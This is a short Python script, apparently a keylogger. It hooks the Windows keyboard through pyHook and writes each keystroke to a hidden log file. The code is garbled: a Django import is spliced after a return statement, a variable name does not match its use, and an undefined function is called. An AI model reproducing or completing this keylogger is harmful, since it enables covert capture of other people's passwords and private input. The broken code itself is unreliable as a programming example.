import pyHook, pythoncom, sys, logging

file_log = 'C:\\important\\.log.txt'

def onKeyevent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    char(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return from django.utils.translation import ugettext_lazy as _

hooks = pyHook.HookManager()
hooks_manager.KeyDown = onKeyevent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()